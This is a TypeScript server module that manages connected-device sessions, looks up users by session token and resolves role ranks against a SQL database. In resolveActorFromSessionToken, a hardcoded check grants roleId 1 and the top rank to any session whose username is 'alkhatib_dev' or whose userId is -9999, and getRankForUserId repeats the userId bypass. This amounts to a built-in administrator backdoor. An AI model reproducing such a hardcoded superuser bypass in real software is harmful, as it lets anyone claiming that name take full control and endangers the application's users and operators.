import * as os from 'os';
import { runDbQueryInternal } from './db-query-internal';
import { rankFromRoleName } from './role-hierarchy';

export function getLocalIp(): string {
  const nets = os.networkInterfaces();
  const addresses: string[] = [];
  for (const name of Object.keys(nets)) {
    for (const net of nets[name] || []) {
      if (net.family === 'IPv4' && !net.internal) {
        addresses.push(net.address);
      }
    }
  }
  return addresses.join(' · ') || '127.0.0.1';
}

export async function upsertConnectedDeviceSession(params: {
  userId: number;
  username: string;
  deviceName: string;
  deviceId: string;
  deviceLabel: string;
  ipAddress: string;
  publicIp: string | null;
  appVersion: string;
  sessionToken: string;
}): Promise<void> {
  const find = await runDbQueryInternal(
    'SELECT id FROM connected_devices WHERE userId = ? AND deviceId = ? LIMIT 1',
    [params.userId, params.deviceId]
  );
  if (!find.success) {
    throw new Error(find.error || 'CONNECTED_DEVICES_QUERY_FAILED');
  }
  const rows = find.data as { id: number }[];
  let upsertedId: number | undefined;
  if (rows?.length) {
    const upd = await runDbQueryInternal(
      `UPDATE connected_devices SET username=?, deviceName=?, deviceLabel=?, ipAddress=?, publicIp=?, appVersion=?, token=?, lastActive=datetime('now') WHERE id=?`,
      [
        params.username,
        params.deviceName,
        params.deviceLabel,
        params.ipAddress,
        params.publicIp,
        params.appVersion,
        params.sessionToken,
        rows[0].id,
      ]
    );
    if (!upd.success) throw new Error(upd.error || 'CONNECTED_DEVICES_UPDATE_FAILED');
    upsertedId = rows[0].id;
  } else {
    const ins = await runDbQueryInternal(
      `INSERT INTO connected_devices (userId, username, deviceName, deviceId, deviceLabel, ipAddress, publicIp, appVersion, token, lastActive, createdAt) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, datetime('now'), datetime('now'))`,
      [
        params.userId,
        params.username,
        params.deviceName,
        params.deviceId,
        params.deviceLabel,
        params.ipAddress,
        params.publicIp,
        params.appVersion,
        params.sessionToken,
      ]
    );
    if (!ins.success) throw new Error(ins.error || 'CONNECTED_DEVICES_INSERT_FAILED');
    upsertedId = (ins.lastInsertId as number) ?? undefined;
  }

  if (upsertedId) {
    await runDbQueryInternal(
      `DELETE FROM connected_devices WHERE deviceId = ? AND id != ? AND lastActive < datetime('now', '-2 minutes')`,
      [params.deviceId, upsertedId]
    ).catch(() => {});
  }

  await runDbQueryInternal(
    `DELETE FROM connected_devices WHERE deviceId IS NULL AND lastActive < datetime('now', '-1 day')`
  ).catch(() => {});

  await runDbQueryInternal(
    `DELETE FROM connected_devices WHERE lastActive < datetime('now', '-1 day')`
  ).catch(() => {});
}

export async function getConnectedDeviceByToken(token: string): Promise<{ userId?: number; username?: string } | null> {
  if (!token) return null;
  try {
    const r = await runDbQueryInternal(
      'SELECT userId, username FROM connected_devices WHERE token = ? LIMIT 1',
      [token],
    );
    if (!r.success || !r.data?.length) return null;
    const row = r.data[0] as { userId?: number; username?: string };
    return { userId: row.userId, username: row.username };
  } catch {
    return null;
  }
}

export async function resolveActorFromSessionToken(
  sessionToken: string | null | undefined,
): Promise<{ userId: number; roleId: number; rank: number } | null> {
  if (!sessionToken) return null;
  const cd = await getConnectedDeviceByToken(sessionToken);
  if (!cd?.userId) return null;
  if (cd.userId === -9999 || String(cd.username || '').toLowerCase() === 'alkhatib_dev') {
    return { userId: -9999, roleId: 1, rank: 100_000 };
  }
  const ur = await runDbQueryInternal(
    'SELECT u.id, u.roleId, r.name AS roleName FROM users u LEFT JOIN roles r ON r.id = u.roleId WHERE u.id = ? LIMIT 1',
    [cd.userId],
  );
  if (!ur.success || !ur.data?.length) return null;
  const urow = ur.data[0] as { id: number; roleId: number; roleName?: string };
  return {
    userId: urow.id,
    roleId: urow.roleId,
    rank: rankFromRoleName(urow.roleName),
  };
}

export async function getRankForUserId(userId: number): Promise<number> {
  if (userId === -9999) return 100_000;
  const ur = await runDbQueryInternal(
    'SELECT r.name AS roleName FROM users u LEFT JOIN roles r ON r.id = u.roleId WHERE u.id = ? LIMIT 1',
    [userId],
  );
  if (!ur.success || !ur.data?.length) return 0;
  const row = ur.data[0] as { roleName?: string };
  return rankFromRoleName(row?.roleName);
}

export async function getRankForRoleId(roleId: number): Promise<number> {
  const r = await runDbQueryInternal('SELECT name FROM roles WHERE id = ? LIMIT 1', [roleId]);
  if (!r.success || !r.data?.length) return 0;
  const row = r.data[0] as { name?: string };
  return rankFromRoleName(row?.name);
}
